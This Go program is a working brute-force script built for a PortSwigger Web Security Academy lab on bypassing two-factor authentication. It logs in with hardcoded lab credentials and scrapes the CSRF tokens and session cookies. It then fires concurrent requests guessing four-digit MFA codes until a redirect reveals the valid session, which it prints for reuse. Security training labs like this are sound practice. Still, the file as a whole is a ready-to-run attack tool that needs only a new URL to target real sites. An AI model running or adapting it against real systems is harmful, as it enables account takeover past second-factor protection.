//Creator Oier Zalba 
//Date 01/12/2022
//Burpsuite intruder alternative
//Scritp example for "2FA bypass using a brute-force attack" portswigger lab
//Edit the loop as you wish

package main

import (
  "fmt"
  "net/http"
  "net/http/cookiejar"
  "sync"
  "log"
  "io/ioutil"
  "bytes"
  "os"
  "math"
  "time"
  "strings"
)

//Insert your url
var url = "https://0a1400a803f06d55c10c05af00ce0028.web-security-academy.net/"
var url2 string
//Miliseconds to wait every 10 querys, increase if the server doesn't handle it
var miliseconds = 200

var username = "carlos" 
var password = "montoya"



//Goroutine to create concurrency
func save_page_to_html( s string, wg *sync.WaitGroup) (int) { 
   
   //Init cookiejar
   jar, err := cookiejar.New(nil)
	if err != nil {
		log.Fatalf("Error while creating cookie jar %s", err.Error())
	}
   
   //Init client without redirection (302), and with cookies
   client := &http.Client{
      CheckRedirect: func(req *http.Request, via []*http.Request) error {
         return http.ErrUseLastResponse
      },
      Jar: jar,
   }
   
   
   
   
   
   
   
   //GET1 gets the first cookie and the first csrf
   req, err := http.NewRequest(http.MethodGet, url,nil)
   if err != nil {
       log.Fatalf("Got error %s", err.Error())
   }

   resp, err := client.Do(req)
   if err != nil {
      log.Fatalf("An Error Occured %v", err)
   }
   defer resp.Body.Close()
     
   body, err := ioutil.ReadAll(resp.Body)
   if err != nil {
      log.Fatalln(err)
   }
   
   //get first cookie
   session := string(resp.Header.Get("Set-Cookie"))[8:40]
   
   //get first csrf
   sb := string(body)
   parts := strings.Split(sb,"\n")
   index := 0
   for i := 0; i < len(parts); i++{
      if strings.Index(parts[i],"csrf") >= 0{         
         index = i
         break
      }
   }  
   parts2 := strings.Split(parts[index],"\"")
   csrf := parts2[5]

   
   
   
   
   //POST1 posts username and password to obtain second cookie after login
   //sets first csrf 
   str := "csrf="+csrf+"&username="+username+"&password="+password
   jsonBody := []byte(str)
   bodyReader := bytes.NewReader(jsonBody)
   
   req, err = http.NewRequest(http.MethodPost, url, bodyReader)
   if err != nil {
    log.Fatalf("Got error %s", err.Error())
   }
   
   //sets first cookie
   cookie := &http.Cookie{
	    Name:   "session",
	    Value:  session,
	    MaxAge: 300,
    }
   req.AddCookie(cookie)
   
   resp, err = client.Do(req)
   if err != nil {
      log.Fatalf("An Error Occured %v", err)
   }
   defer resp.Body.Close()
   
   //gets second cookie
   session = string(resp.Header.Get("Set-Cookie"))[8:40]
   
   
   
   
   
   
   
   //GET2 to obtain second csrf
   req, err = http.NewRequest(http.MethodGet, url2,nil)
   if err != nil {
       log.Fatalf("Got error %s", err.Error())
   }
   
   //sets second cookie
   cookie = &http.Cookie{
	    Name:   "session",
	    Value:  session,
	    MaxAge: 300,
    }
   req.AddCookie(cookie)

   resp, err = client.Do(req)
   if err != nil {
      log.Fatalf("An Error Occured %v", err)
   }
   defer resp.Body.Close()
    
   
   
   body, err = ioutil.ReadAll(resp.Body)
   if err != nil {
      log.Fatalln(err)
   }
   
   //gets second csrf
   sb = string(body)
   parts = strings.Split(sb,"\n")
   index = 0
   for i := 0; i < len(parts); i++{
      if strings.Index(parts[i],"csrf") >= 0{         
         index = i
         break
      }
   }  
   parts2 = strings.Split(parts[index],"\"")
   csrf = parts2[5]
   
   
   
   
   
   
   
   
   //POST2 sends second cookie and second csfr among mfa-code
   str = "csrf="+csrf+"&mfa-code="+s
   jsonBody = []byte(str)
   bodyReader = bytes.NewReader(jsonBody)

   req, err = http.NewRequest(http.MethodPost, url2, bodyReader)
   if err != nil {
    log.Fatalf("Got error %s", err.Error())
   }
   
   //sets second cookie
   req.AddCookie(cookie)
   
   resp, err = client.Do(req)
   if err != nil {
      log.Fatalf("An Error Occured %v", err)
   }
   defer resp.Body.Close()
   
   fmt.Println("mfa-code:",s,"Status code:", resp.StatusCode,"Lenght response:", string(resp.Header.Get("Content-Length")))
   
   //The stop signal
   if resp.StatusCode == 302{
       fmt.Println("*************************************************")
       fmt.Println("Stop signal send, code found")
       fmt.Println("The header is:")
       fmt.Println(resp.Header)
       fmt.Println("Use the cookie to enter the session to get the flag")
       
       os.Exit(1)
   }

   wg.Done()
   return resp.StatusCode
}

func main() {
    
    url = url+"login"
    url2 = url+"2"
    
    var wg sync.WaitGroup //Manage goroutines
    
    //Loop
    for i := 0; i < 1000; i++ {
        
     wg.Add(1)

     s := fmt.Sprintf("%04d", i)
          
     go save_page_to_html(s, &wg)
     
      //Timeout to dont saturate de server
      if math.Mod(float64(i),10) == 9{
         time.Sleep(time.Millisecond * time.Duration(miliseconds))
      }

        
    }
    
    wg.Wait()
    fmt.Println("Finished")

}
